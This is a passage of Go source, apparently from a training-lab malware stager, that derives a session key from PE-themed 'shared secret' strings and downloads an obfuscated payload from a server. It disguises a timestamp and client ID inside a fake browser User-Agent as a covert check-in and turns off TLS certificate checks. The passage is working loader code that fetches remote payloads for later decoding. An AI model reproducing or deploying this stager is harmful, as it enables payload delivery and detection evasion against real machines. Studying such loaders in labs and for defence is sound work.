	// The specific bytes depend on the seed calculation, e.g., could be something like [0x88 0x0F 0x9A 0x2B]
	return string(result)
}

// Generates the full "shared secret" string
func generatePEValidationKey() string {
	alignmentSignature := getPESectionAlignmentString()
	checksumSignature := verifyPEChecksumValue(PE_CHECKSUM_SEED)
	return alignmentSignature + checksumSignature // Concatenates the two parts
}

// Derives the final session key from shared secret and dynamic parameters
func deriveKeyFromParams(timestamp, clientID string, sharedSecret string) string {
	combined := sharedSecret + timestamp + clientID
	// Simple key stretching/derivation: repeat/truncate combined string to 32 bytes
	key := make([]byte, 32)
	lenCombined := len(combined)
	if lenCombined == 0 { // Avoid division by zero if combined is empty
		return string(key) // Return zero key
	}
	for i := 0; i < 32; i++ {
		key[i] = combined[i%lenCombined]
	}
	return string(key)
}

// downloadPayload connects to the server and retrieves the obfuscated payload
func downloadPayload(serverURL string, clientID string) ([]byte, string, error) { // Returns obfuscated bytes, timestamp used, error
	fmt.Printf("[+] Connecting to server: %s\n", serverURL)

	// Create HTTP client, skipping TLS verification for self-signed certs
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 30 * time.Second}

	// Generate timestamp (must be used for key derivation later)
	timestamp := fmt.Sprintf("%d", time.Now().Unix())
	fmt.Printf("[+] Using Timestamp: %s\n", timestamp)
	fmt.Printf("[+] Using ClientID: %s\n", clientID) // Using placeholder for this lab

	// Create custom User-Agent
	// Format MUST match what the server's extractClientInfo expects
	customUA := fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) rv:%s-%s", timestamp, clientID)
	fmt.Printf("[+] Sending User-Agent: %s\n", customUA)

	// Create GET request
	req, err := http.NewRequest("GET", serverURL, nil)
	if err != nil {
		return nil, "", fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("User-Agent", customUA)

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return nil, "", fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	// Check status code
	if resp.StatusCode != http.StatusOK {
		// Try reading body for more info if possible
		bodyBytes, _ := ioutil.ReadAll(resp.Body)
		return nil, "", fmt.Errorf("server returned error: %d - %s", resp.StatusCode, string(bodyBytes))
	}

	// Read response body (this is the obfuscated payload)
	obfuscatedData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, "", fmt.Errorf("failed to read response body: %w", err)
	}

	fmt.Printf("[+] Downloaded %d bytes of obfuscated payload.\n", len(obfuscatedData))
	return obfuscatedData, timestamp, nil // Return payload AND timestamp
}
